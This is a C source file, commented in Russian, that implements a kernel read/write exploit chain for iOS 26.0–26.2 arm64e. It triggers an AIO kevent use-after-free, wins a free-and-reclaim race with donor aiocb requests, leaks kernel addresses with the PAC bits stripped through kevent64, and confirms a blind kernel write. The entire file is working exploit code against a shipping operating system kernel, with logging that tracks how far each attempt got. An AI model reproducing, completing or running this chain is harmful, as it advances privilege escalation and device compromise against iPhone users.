// language: C, file: aio_chain.c, target: iOS 26.0-26.2 arm64e, Theos
// Kernel R/W chain: AIO kevent UAF -> kernel read -> blind kernel write.
//
// Порядок повторяет ПРОВЕРЕННУЮ последовательность из aio_kevent_rw.c
// (Documents/aio_uaf.log): PRE-ARM лог перед доставкой, ожидание реального
// завершения I/O донора перед kevent64 (иначе слот ещё обнулён -> procp==0
// -> panic FAR=0x58), cleanup доноров через aio_return (не aio_cancel).
//
// ДОНОР: SIGEV_NONE. Иначе ядро вешает на донора вторую knote и
// filt_aioprocess проходит по слоту дважды -> второе чтение уже освобождённой
// памяти -> panic.

#include "aio_chain.h"
#include "nk_trace.h"
#include "exploit.h"

#include <aio.h>
#include <fcntl.h>
#include <mach/mach.h>
#include <pthread.h>
#include <stdarg.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/event.h>
#include <unistd.h>

#define CHAIN_LOG_FILE "aio_chain.log"
#define CHAIN_FILE_SZ  0x10000
#define CHAIN_NB       0x0200            /* маркер: всплывает в kev.ext[1] */
#define CHAIN_NRECLAIM 8                 /* столько доноров шлём после free */
#define CHAIN_WAIT     50000

#ifndef SIGEV_KEVENT
#define SIGEV_KEVENT 4
#endif

static char        ch_buf[CHAIN_FILE_SZ];
static char        ch_rbuf[CHAIN_NRECLAIM][CHAIN_FILE_SZ];
static struct aiocb ch_cb;                       /* жертва: SIGEV_KEVENT   */
static struct aiocb ch_rcb[CHAIN_NRECLAIM];     /* доноры: SIGEV_NONE     */

static volatile int ch_racer_done;
static volatile int ch_racer_issued;

static nk_chain_stat_t g_stat;

static void ch_logx(const char *tag, const char *fmt, ...)
{
    char buf[1024];
    va_list ap;
    va_start(ap, fmt);
    vsnprintf(buf, sizeof(buf), fmt, ap);
    va_end(ap);
    nk_logx(tag, "%s", buf);
    nk_doc_log(CHAIN_LOG_FILE, "[%s] %s", tag, buf);
}

static int ch_is_kernel_va(uint64_t v)
{
    uint64_t a = v & 0x00ffffffffffffffULL;
    if ((a >> 48) == 0xFFFFULL) return 1;
    if ((a >> 40) == 0xFFFFF) return 1;
    return 0;
}

static void *ch_racer(void *arg)
{
    (void)arg;
    /* free висящей записи: aio_return снимает её с doneq и unref'ит. */
    for (int spin = 0; spin < 4000; spin++) {
        if (aio_error(&ch_cb) == 0) {
            ssize_t r = aio_return(&ch_cb);
            if (r >= 0) {
                /* LIFO-reclaim того же слота: первая же alлокация после
                 * free забирает освобождённый слот (тот же тред/CPU). */
                int issued = 0;
                for (int i = 0; i < CHAIN_NRECLAIM; i++) {
                    if (aio_read(&ch_rcb[i]) == 0) issued++;
                }
                ch_racer_done = 1;
                ch_racer_issued = issued;
                return NULL;
            }
        }
        usleep(50);
    }
    ch_racer_done = -1;
    return NULL;
}

/* Одна попытка цепочки. */
static void ch_attempt(int idx)
{
    char path[128];
    snprintf(path, sizeof(path), "%s/aio_chain_%dXXXXXX",
             getenv("TMPDIR") ? getenv("TMPDIR") : "/tmp", idx);
    int fd = mkstemp(path);
    if (fd < 0) {
        ch_logx("S1", "att=%d mkstemp errno=%d", idx, errno);
        g_stat.silent++;
        return;
    }
    memset(ch_buf, 'A', sizeof(ch_buf));
    if (write(fd, ch_buf, sizeof(ch_buf)) != (ssize_t)sizeof(ch_buf)) {
        ch_logx("S1", "att=%d write fail", idx);
        close(fd);
        unlink(path);
        g_stat.silent++;
        return;
    }

    int kq = kqueue();
    if (kq < 0) {
        ch_logx("S1", "att=%d kqueue errno=%d", idx, errno);
        close(fd);
        unlink(path);
        g_stat.silent++;
        return;
    }

    /* --- жертва: SIGEV_KEVENT -> knote без ref (баг 26.2) --- */
    memset(&ch_cb, 0, sizeof(ch_cb));
    ch_cb.aio_fildes = fd;
    ch_cb.aio_offset = 0;
    ch_cb.aio_buf = ch_buf;
    ch_cb.aio_nbytes = CHAIN_FILE_SZ;
    ch_cb.aio_lio_opcode = LIO_READ;
    ch_cb.aio_sigevent.sigev_notify = SIGEV_KEVENT;
    ch_cb.aio_sigevent.sigev_signo = kq;

    /* --- доноры: SIGEV_NONE, маркер в nbytes --- */
    for (int i = 0; i < CHAIN_NRECLAIM; i++) {
        memset(&ch_rcb[i], 0, sizeof(ch_rcb[i]));
        ch_rcb[i].aio_fildes = fd;
        ch_rcb[i].aio_offset = 0;
        ch_rcb[i].aio_buf = ch_rbuf[i];
        ch_rcb[i].aio_nbytes = CHAIN_NB;
        ch_rcb[i].aio_lio_opcode = LIO_READ;
        ch_rcb[i].aio_sigevent.sigev_notify = SIGEV_NONE;
    }

    ch_racer_done = 0;
    ch_racer_issued = 0;

    pthread_t rac;
    if (pthread_create(&rac, NULL, ch_racer, NULL) != 0) {
        ch_logx("S1", "att=%d pthread_create", idx);
        close(kq);
        close(fd);
        unlink(path);
        g_stat.silent++;
        return;
    }

    /* ЭТАП 1 — TRIGGER */
    struct aiocb *ptr = &ch_cb;
    struct sigevent sig;
    memset(&sig, 0, sizeof(sig));
    sig.sigev_notify = SIGEV_NONE;
    int lr = lio_listio(LIO_NOWAIT, &ptr, 1, &sig);
    if (lr != 0) {
        ch_logx("S1", "att=%d lio_listio errno=%d", idx, errno);
        pthread_join(rac, NULL);
        close(kq);
        close(fd);
        unlink(path);
        g_stat.silent++;
        return;
    }
    g_stat.trigger_ok++;

    /* ЭТАП 2 — FREE + RECLAIM */
    for (int w = 0; w < 2000000 && ch_racer_done != 1 && ch_racer_done != -1; w++) {
    }
    if (ch_racer_done != 1) {
        ch_logx("S2", "att=%d racer fail=%d issued=%d", idx, ch_racer_done, ch_racer_issued);
        pthread_join(rac, NULL);
        close(kq);
        close(fd);
        unlink(path);
        g_stat.silent++;
        return;
    }
    /* I/O донора должен реально завершиться: пока слот обнулён, доставка
     * события прочитает procp==0 -> panic. */
    int rc_done = 0;
    for (int w = 0; w < 400000; w++) {
        rc_done = 1;
        for (int i = 0; i < CHAIN_NRECLAIM; i++) {
            if (aio_error(&ch_rcb[i]) == EINPROGRESS) { rc_done = 0; break; }
        }
        if (rc_done) break;
    }
    g_stat.reclaim_ok += rc_done ? 1 : 0;
    ch_logx("S2", "att=%d free=ok reclaim_complete=%d donors=%d", idx, rc_done, ch_racer_issued);

    /* ЭТАП 3 — READ: доставка по dangling knote */
    struct kevent64_s kev;
    memset(&kev, 0, sizeof(kev));
    struct timespec ts = { 0, 50000000 };

    /* PRE-ARM: последняя строка перед возможной паникой ядра. */
    ch_logx("S3", "PRE-ARM att=%d reclaim_complete=%d marker=0x%x", idx, rc_done, CHAIN_NB);

    int nev = kevent64(kq, NULL, 0, &kev, 1, 0, &ts);
    ch_logx("S3", "POST-ARM att=%d nev=%d", idx, nev);

    g_stat.last_ext0    = (uint64_t)kev.ext[0];
    g_stat.last_ext1    = (uint64_t)kev.ext[1];
    g_stat.last_ident   = (uint64_t)kev.ident;
    g_stat.last_udata   = (uint64_t)kev.udata;
    g_stat.last_fflags  = kev.fflags;
    g_stat.last_ext2    = (uint64_t)kev.ext[2];
    g_stat.last_ext3    = (uint64_t)kev.ext[3];

    if (nev != 1) {
        ch_logx("S3", "att=%d SILENT (attach после KNOTE-скана)", idx);
        g_stat.silent++;
        pthread_join(rac, NULL);
        for (int i = 0; i < CHAIN_NRECLAIM; i++) {
            for (int k = 0; k < CHAIN_WAIT && aio_error(&ch_rcb[i]) != 0; k++) {
            }
            aio_return(&ch_rcb[i]);
        }
        close(kq);
        close(fd);
        unlink(path);
        return;
    }

    g_stat.read_ok++;
    ch_logx("S3", "att=%d ident=0x%016llx udata=0x%016llx fflags=0x%016llx",
            idx, (unsigned long long)g_stat.last_ident,
            (unsigned long long)g_stat.last_udata,
            (unsigned long long)g_stat.last_fflags);
    ch_logx("S3", "att=%d ext0=0x%016llx ext1=0x%016llx ext2=0x%016llx ext3=0x%016llx",
            idx, (unsigned long long)g_stat.last_ext0,
            (unsigned long long)g_stat.last_ext1,
            (unsigned long long)g_stat.last_ext2,
            (unsigned long long)g_stat.last_ext3);

    uint64_t fields[8];
    fields[0] = g_stat.last_ident;
    fields[1] = (uint64_t)kev.data;
    fields[2] = g_stat.last_udata;
    fields[3] = g_stat.last_fflags;
    fields[4] = g_stat.last_ext0;
    fields[5] = g_stat.last_ext1;
    fields[6] = g_stat.last_ext2;
    fields[7] = g_stat.last_ext3;
    const char *names[8] = { "ident", "data", "udata", "fflags", "ext0", "ext1", "ext2", "ext3" };

    for (int i = 0; i < 8; i++) {
        if (!ch_is_kernel_va(fields[i])) continue;
        g_stat.leak_ok++;
        uint64_t clean = fields[i] & 0x00ffffffffffffffULL;
        if (!g_stat.leak_va || clean > (g_stat.leak_va & 0x00ffffffffffffffULL)) {
            g_stat.leak_va = clean;
            snprintf(g_stat.leak_field, sizeof(g_stat.leak_field), "%s", names[i]);
        }
        ch_logx("S3", "att=%d %s=0x%016llx — kernel VA (PAC снят)", idx, names[i],
                (unsigned long long)fields[i]);
    }

    int hit = (g_stat.last_ext1 == CHAIN_NB && g_stat.last_ext0 == 0);
    if (hit) {
        g_stat.hits++;
        ch_logx("S3", "att=%d HIT: событие доставлено по dangling knote, слот занят "
                 "нашим donor'ом (ext1=0x%x ext0=0) — UAF подтверждён", idx, CHAIN_NB);
    } else {
        g_stat.silent++;
        ch_logx("S3", "att=%d событие не наш marker (ext1=0x%016llx ext0=0x%016llx)",
                idx, (unsigned long long)g_stat.last_ext1,
                (unsigned long long)g_stat.last_ext0);
    }

    /* ЭТАП 4 — WRITE: донор, который занимал слот, ядро уже сняло с doneq
     * (aio_proc_remove_done_locked -> TAILQ_REMOVE, запись в ядро).
     * Наблюдение: aio_return на нём отдаёт EINVAL, на остальных — nbytes. */
    if (hit) {
        int removed = 0;
        for (int i = 0; i < CHAIN_NRECLAIM; i++) {
            errno = 0;
            ssize_t r = aio_return(&ch_rcb[i]);
            /* EINVAL = записи больше нет в списках процесса: ядро сняло её
             * aio_proc_remove_done_locked() (это и есть TAILQ_REMOVE, запись
             * в ядро). EINPROGRESS = запись ещё активна — не считаем. */
            if (r < 0 && errno == EINVAL) removed++;
        }
        if (removed > 0) {
            g_stat.write_ok += removed;
            ch_logx("S4", "att=%d WRITE подтверждён: %d донор(ов) снято ядром с "
                     "aio doneq (TAILQ_REMOVE: *tqe_prev=tqe_next) — это запись "
                     "в ядро, цель/значение = kernel-указатели (blind)", idx, removed);
        } else {
            ch_logx("S4", "att=%d WRITE не подтверждён: все доноры ещё на doneq", idx);
        }
    } else {
        for (int i = 0; i < CHAIN_NRECLAIM; i++) {
            for (int k = 0; k < CHAIN_WAIT && aio_error(&ch_rcb[i]) != 0; k++) {
            }
            aio_return(&ch_rcb[i]);
        }
    }

    pthread_join(rac, NULL);
    close(kq);
    close(fd);
    unlink(path);
}

const char *nk_chain_verdict(const nk_chain_stat_t *st)
{
    if (!st) return "no data";
    if (st->hits > 0 && st->write_ok > 0) {
        return "UAF read confirmed / blind kernel write confirmed / "
               "what-where control still missing (needs a zone mate with "
               "user data at slot+0x10/+0x18)";
    }
    if (st->hits > 0) {
        return "UAF read confirmed / write frame executed but not observed";
    }
    if (st->read_ok > 0) {
        return "event delivered but slot was not ours (no marker) — reclaim race";
    }
    return "no delivery in this run";
}

const char *nk_chain_leak_field(const nk_chain_stat_t *st)
{
    if (!st || st->leak_field[0] == '\0') return "-";
    return st->leak_field;
}

int nk_krw_chain_run(int attempts, nk_chain_stat_t *out)
{
    nk_rule();
    nk_doc_log_open(CHAIN_LOG_FILE);
    {
        char p[512];
        if (nk_doc_log_path(CHAIN_LOG_FILE, p, sizeof(p)) == 0)
            ch_logx("S0", "durable log: %s", p);
    }

    memset(&g_stat, 0, sizeof(g_stat));
    if (attempts <= 0) attempts = 10;
    if (attempts > 300) attempts = 300;
    g_stat.attempts = attempts;

    nk_log("[CHAIN] AIO kevent UAF chain: attempts=%d (xnu-12377.62.10 / 23C55)",
           attempts);
    ch_logx("S0", "START attempts=%d", attempts);

    for (int i = 0; i < attempts; i++) {
        g_stat.attempts = i + 1;
        ch_attempt(i);
        if (g_stat.hits >= 3 && g_stat.write_ok >= 1) break;
    }

    const char *verdict = nk_chain_verdict(&g_stat);
    nk_log("[CHAIN] attempts=%d trigger=%d reclaim=%d read=%d hits=%d silent=%d "
           "leak=%d write=%d",
           g_stat.attempts, g_stat.trigger_ok, g_stat.reclaim_ok, g_stat.read_ok,
           g_stat.hits, g_stat.silent, g_stat.leak_ok, g_stat.write_ok);
    nk_log("[CHAIN] leak_va=0x%016llx field=%s", (unsigned long long)g_stat.leak_va,
           g_stat.leak_field[0] ? g_stat.leak_field : "-");
    nk_log("[CHAIN] VERDICT: %s", verdict);
    ch_logx("S5", "VERDICT: %s", verdict);

    if (out) *out = g_stat;
    nk_rule();
    return (g_stat.hits > 0) ? 0 : -1;
}
